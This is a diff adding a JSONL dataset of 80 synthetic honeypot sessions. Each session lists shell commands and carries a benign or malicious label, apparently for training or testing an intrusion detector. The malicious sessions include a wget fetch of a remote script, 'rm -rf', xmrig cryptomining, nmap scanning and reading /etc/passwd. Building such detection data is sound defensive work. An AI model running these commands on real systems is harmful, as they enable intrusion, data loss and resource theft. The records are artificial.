@@ -1,0 +1,80 @@
+{"commands": ["pwd"], "label": 0, "session_id": "synthetic-seq-00000", "src_ip": "198.51.100.72", "synthetic": true}
+{"commands": ["whoami", "rm -rf /tmp/deephoney-demo-only", "crontab -l", "id", "systemctl status"], "label": 1, "session_id": "synthetic-seq-00001", "src_ip": "203.0.113.50", "synthetic": true}
+{"commands": ["ls -la", "whoami", "pwd"], "label": 0, "session_id": "synthetic-seq-00002", "src_ip": "198.51.100.69", "synthetic": true}
+{"commands": ["xmrig --donate-level 1", "nmap -sT 192.0.2.0/24", "whoami", "uname -a", "id"], "label": 1, "session_id": "synthetic-seq-00003", "src_ip": "203.0.113.54", "synthetic": true}
+{"commands": ["id"], "label": 0, "session_id": "synthetic-seq-00004", "src_ip": "198.51.100.66", "synthetic": true}
+{"commands": ["rm -rf /tmp/deephoney-demo-only", "whoami", "nmap -sT 192.0.2.0/24", "systemctl status", "xmrig --donate-level 1", "wget http://198.51.100.20/deephoney-demo.sh"], "label": 1, "session_id": "synthetic-seq-00005", "src_ip": "203.0.113.62", "synthetic": true}
+{"commands": ["uname -a"], "label": 0, "session_id": "synthetic-seq-00006", "src_ip": "198.51.100.68", "synthetic": true}
+{"commands": ["whoami", "uname -a"], "label": 1, "session_id": "synthetic-seq-00007", "src_ip": "203.0.113.76", "synthetic": true}
+{"commands": ["pwd"], "label": 0, "session_id": "synthetic-seq-00008", "src_ip": "198.51.100.58", "synthetic": true}
+{"commands": ["xmrig --donate-level 1", "systemctl status"], "label": 1, "session_id": "synthetic-seq-00009", "src_ip": "203.0.113.53", "synthetic": true}
+{"commands": ["df -h", "df -h", "df -h"], "label": 0, "session_id": "synthetic-seq-00010", "src_ip": "198.51.100.51", "synthetic": true}
+{"commands": ["systemctl status", "rm -rf /tmp/deephoney-demo-only"], "label": 1, "session_id": "synthetic-seq-00011", "src_ip": "203.0.113.75", "synthetic": true}
+{"commands": ["df -h", "pwd", "pwd"], "label": 0, "session_id": "synthetic-seq-00012", "src_ip": "198.51.100.66", "synthetic": true}
+{"commands": ["rm -rf /tmp/deephoney-demo-only", "whoami", "id", "crontab -l", "uname -a", "systemctl status"], "label": 1, "session_id": "synthetic-seq-00013", "src_ip": "203.0.113.58", "synthetic": true}
+{"commands": ["df -h", "id"], "label": 0, "session_id": "synthetic-seq-00014", "src_ip": "198.51.100.71", "synthetic": true}
+{"commands": ["id", "xmrig --donate-level 1", "wget http://198.51.100.20/deephoney-demo.sh", "rm -rf /tmp/deephoney-demo-only", "crontab -l"], "label": 1, "session_id": "synthetic-seq-00015", "src_ip": "203.0.113.72", "synthetic": true}
+{"commands": ["uname -a", "ls -la"], "label": 0, "session_id": "synthetic-seq-00016", "src_ip": "198.51.100.80", "synthetic": true}
+{"commands": ["systemctl status", "id", "crontab -l", "whoami"], "label": 1, "session_id": "synthetic-seq-00017", "src_ip": "203.0.113.77", "synthetic": true}
+{"commands": ["df -h", "id", "whoami"], "label": 0, "session_id": "synthetic-seq-00018", "src_ip": "198.51.100.75", "synthetic": true}
+{"commands": ["id", "xmrig --donate-level 1", "nmap -sT 192.0.2.0/24", "rm -rf /tmp/deephoney-demo-only"], "label": 1, "session_id": "synthetic-seq-00019", "src_ip": "203.0.113.68", "synthetic": true}
+{"commands": ["id"], "label": 0, "session_id": "synthetic-seq-00020", "src_ip": "198.51.100.50", "synthetic": true}
+{"commands": ["id", "whoami"], "label": 1, "session_id": "synthetic-seq-00021", "src_ip": "203.0.113.73", "synthetic": true}
+{"commands": ["cat /etc/os-release"], "label": 0, "session_id": "synthetic-seq-00022", "src_ip": "198.51.100.78", "synthetic": true}
+{"commands": ["crontab -l", "id", "xmrig --donate-level 1", "rm -rf /tmp/deephoney-demo-only", "wget http://198.51.100.20/deephoney-demo.sh", "nmap -sT 192.0.2.0/24"], "label": 1, "session_id": "synthetic-seq-00023", "src_ip": "203.0.113.52", "synthetic": true}
+{"commands": ["uname -a", "uname -a", "df -h"], "label": 0, "session_id": "synthetic-seq-00024", "src_ip": "198.51.100.56", "synthetic": true}
+{"commands": ["nmap -sT 192.0.2.0/24", "cat /etc/passwd", "systemctl status", "wget http://198.51.100.20/deephoney-demo.sh"], "label": 1, "session_id": "synthetic-seq-00025", "src_ip": "203.0.113.79", "synthetic": true}
+{"commands": ["ls -la", "pwd"], "label": 0, "session_id": "synthetic-seq-00026", "src_ip": "198.51.100.51", "synthetic": true}
+{"commands": ["xmrig --donate-level 1", "whoami", "cat /etc/passwd"], "label": 1, "session_id": "synthetic-seq-00027", "src_ip": "203.0.113.72", "synthetic": true}
+{"commands": ["uname -a", "df -h", "id"], "label": 0, "session_id": "synthetic-seq-00028", "src_ip": "198.51.100.80", "synthetic": true}
+{"commands": ["cat /etc/passwd", "crontab -l"], "label": 1, "session_id": "synthetic-seq-00029", "src_ip": "203.0.113.62", "synthetic": true}
+{"commands": ["id", "uname -a"], "label": 0, "session_id": "synthetic-seq-00030", "src_ip": "198.51.100.64", "synthetic": true}
+{"commands": ["uname -a", "id", "xmrig --donate-level 1", "systemctl status"], "label": 1, "session_id": "synthetic-seq-00031", "src_ip": "203.0.113.77", "synthetic": true}
+{"commands": ["whoami", "cat /etc/os-release", "whoami"], "label": 0, "session_id": "synthetic-seq-00032", "src_ip": "198.51.100.80", "synthetic": true}
+{"commands": ["systemctl status", "crontab -l"], "label": 1, "session_id": "synthetic-seq-00033", "src_ip": "203.0.113.58", "synthetic": true}
+{"commands": ["id"], "label": 0, "session_id": "synthetic-seq-00034", "src_ip": "198.51.100.64", "synthetic": true}
+{"commands": ["nmap -sT 192.0.2.0/24", "whoami", "cat /etc/passwd", "uname -a", "id", "systemctl status"], "label": 1, "session_id": "synthetic-seq-00035", "src_ip": "203.0.113.69", "synthetic": true}
+{"commands": ["id", "ls -la"], "label": 0, "session_id": "synthetic-seq-00036", "src_ip": "198.51.100.63", "synthetic": true}
+{"commands": ["uname -a", "whoami"], "label": 1, "session_id": "synthetic-seq-00037", "src_ip": "203.0.113.62", "synthetic": true}
+{"commands": ["pwd"], "label": 0, "session_id": "synthetic-seq-00038", "src_ip": "198.51.100.60", "synthetic": true}
+{"commands": ["xmrig --donate-level 1", "whoami", "systemctl status"], "label": 1, "session_id": "synthetic-seq-00039", "src_ip": "203.0.113.54", "synthetic": true}
+{"commands": ["id", "id", "id"], "label": 0, "session_id": "synthetic-seq-00040", "src_ip": "198.51.100.51", "synthetic": true}
+{"commands": ["wget http://198.51.100.20/deephoney-demo.sh", "rm -rf /tmp/deephoney-demo-only"], "label": 1, "session_id": "synthetic-seq-00041", "src_ip": "203.0.113.72", "synthetic": true}
+{"commands": ["cat /etc/os-release", "df -h"], "label": 0, "session_id": "synthetic-seq-00042", "src_ip": "198.51.100.75", "synthetic": true}
+{"commands": ["rm -rf /tmp/deephoney-demo-only", "crontab -l"], "label": 1, "session_id": "synthetic-seq-00043", "src_ip": "203.0.113.54", "synthetic": true}
+{"commands": ["id", "uname -a"], "label": 0, "session_id": "synthetic-seq-00044", "src_ip": "198.51.100.73", "synthetic": true}
+{"commands": ["rm -rf /tmp/deephoney-demo-only", "whoami", "wget http://198.51.100.20/deephoney-demo.sh"], "label": 1, "session_id": "synthetic-seq-00045", "src_ip": "203.0.113.68", "synthetic": true}
+{"commands": ["ls -la", "pwd", "df -h"], "label": 0, "session_id": "synthetic-seq-00046", "src_ip": "198.51.100.65", "synthetic": true}
+{"commands": ["wget http://198.51.100.20/deephoney-demo.sh", "xmrig --donate-level 1", "rm -rf /tmp/deephoney-demo-only", "systemctl status"], "label": 1, "session_id": "synthetic-seq-00047", "src_ip": "203.0.113.63", "synthetic": true}
+{"commands": ["ls -la", "whoami", "cat /etc/os-release"], "label": 0, "session_id": "synthetic-seq-00048", "src_ip": "198.51.100.68", "synthetic": true}
+{"commands": ["cat /etc/passwd", "systemctl status"], "label": 1, "session_id": "synthetic-seq-00049", "src_ip": "203.0.113.79", "synthetic": true}
+{"commands": ["df -h", "df -h", "cat /etc/os-release"], "label": 0, "session_id": "synthetic-seq-00050", "src_ip": "198.51.100.54", "synthetic": true}
+{"commands": ["uname -a", "id", "cat /etc/passwd"], "label": 1, "session_id": "synthetic-seq-00051", "src_ip": "203.0.113.69", "synthetic": true}
+{"commands": ["cat /etc/os-release", "whoami", "uname -a"], "label": 0, "session_id": "synthetic-seq-00052", "src_ip": "198.51.100.58", "synthetic": true}
+{"commands": ["rm -rf /tmp/deephoney-demo-only", "nmap -sT 192.0.2.0/24"], "label": 1, "session_id": "synthetic-seq-00053", "src_ip": "203.0.113.59", "synthetic": true}
+{"commands": ["pwd"], "label": 0, "session_id": "synthetic-seq-00054", "src_ip": "198.51.100.64", "synthetic": true}
+{"commands": ["wget http://198.51.100.20/deephoney-demo.sh", "rm -rf /tmp/deephoney-demo-only", "whoami", "id", "crontab -l"], "label": 1, "session_id": "synthetic-seq-00055", "src_ip": "203.0.113.61", "synthetic": true}
+{"commands": ["pwd", "uname -a"], "label": 0, "session_id": "synthetic-seq-00056", "src_ip": "198.51.100.75", "synthetic": true}
+{"commands": ["rm -rf /tmp/deephoney-demo-only", "crontab -l", "wget http://198.51.100.20/deephoney-demo.sh", "cat /etc/passwd"], "label": 1, "session_id": "synthetic-seq-00057", "src_ip": "203.0.113.75", "synthetic": true}
+{"commands": ["id", "pwd"], "label": 0, "session_id": "synthetic-seq-00058", "src_ip": "198.51.100.59", "synthetic": true}
+{"commands": ["cat /etc/passwd", "systemctl status", "wget http://198.51.100.20/deephoney-demo.sh", "xmrig --donate-level 1", "uname -a"], "label": 1, "session_id": "synthetic-seq-00059", "src_ip": "203.0.113.80", "synthetic": true}
+{"commands": ["pwd"], "label": 0, "session_id": "synthetic-seq-00060", "src_ip": "198.51.100.78", "synthetic": true}
+{"commands": ["whoami", "cat /etc/passwd"], "label": 1, "session_id": "synthetic-seq-00061", "src_ip": "203.0.113.55", "synthetic": true}
+{"commands": ["df -h", "whoami", "whoami"], "label": 0, "session_id": "synthetic-seq-00062", "src_ip": "198.51.100.72", "synthetic": true}
+{"commands": ["cat /etc/passwd", "wget http://198.51.100.20/deephoney-demo.sh", "rm -rf /tmp/deephoney-demo-only", "nmap -sT 192.0.2.0/24", "xmrig --donate-level 1", "whoami"], "label": 1, "session_id": "synthetic-seq-00063", "src_ip": "203.0.113.76", "synthetic": true}
+{"commands": ["cat /etc/os-release"], "label": 0, "session_id": "synthetic-seq-00064", "src_ip": "198.51.100.73", "synthetic": true}
+{"commands": ["crontab -l", "whoami", "id", "nmap -sT 192.0.2.0/24", "wget http://198.51.100.20/deephoney-demo.sh", "xmrig --donate-level 1"], "label": 1, "session_id": "synthetic-seq-00065", "src_ip": "203.0.113.74", "synthetic": true}
+{"commands": ["uname -a", "id"], "label": 0, "session_id": "synthetic-seq-00066", "src_ip": "198.51.100.68", "synthetic": true}
+{"commands": ["xmrig --donate-level 1", "nmap -sT 192.0.2.0/24", "uname -a", "systemctl status", "rm -rf /tmp/deephoney-demo-only"], "label": 1, "session_id": "synthetic-seq-00067", "src_ip": "203.0.113.67", "synthetic": true}
+{"commands": ["whoami", "df -h"], "label": 0, "session_id": "synthetic-seq-00068", "src_ip": "198.51.100.80", "synthetic": true}
+{"commands": ["uname -a", "rm -rf /tmp/deephoney-demo-only"], "label": 1, "session_id": "synthetic-seq-00069", "src_ip": "203.0.113.65", "synthetic": true}
+{"commands": ["pwd"], "label": 0, "session_id": "synthetic-seq-00070", "src_ip": "198.51.100.53", "synthetic": true}
+{"commands": ["cat /etc/passwd", "rm -rf /tmp/deephoney-demo-only", "id", "xmrig --donate-level 1", "nmap -sT 192.0.2.0/24", "whoami"], "label": 1, "session_id": "synthetic-seq-00071", "src_ip": "203.0.113.80", "synthetic": true}
+{"commands": ["pwd"], "label": 0, "session_id": "synthetic-seq-00072", "src_ip": "198.51.100.50", "synthetic": true}
+{"commands": ["wget http://198.51.100.20/deephoney-demo.sh", "crontab -l"], "label": 1, "session_id": "synthetic-seq-00073", "src_ip": "203.0.113.79", "synthetic": true}
+{"commands": ["uname -a"], "label": 0, "session_id": "synthetic-seq-00074", "src_ip": "198.51.100.78", "synthetic": true}
+{"commands": ["crontab -l", "whoami", "uname -a", "cat /etc/passwd"], "label": 1, "session_id": "synthetic-seq-00075", "src_ip": "203.0.113.77", "synthetic": true}
+{"commands": ["ls -la"], "label": 0, "session_id": "synthetic-seq-00076", "src_ip": "198.51.100.64", "synthetic": true}
+{"commands": ["uname -a", "id"], "label": 1, "session_id": "synthetic-seq-00077", "src_ip": "203.0.113.57", "synthetic": true}
+{"commands": ["id"], "label": 0, "session_id": "synthetic-seq-00078", "src_ip": "198.51.100.69", "synthetic": true}
+{"commands": ["cat /etc/passwd", "uname -a", "nmap -sT 192.0.2.0/24"], "label": 1, "session_id": "synthetic-seq-00079", "src_ip": "203.0.113.51", "synthetic": true}
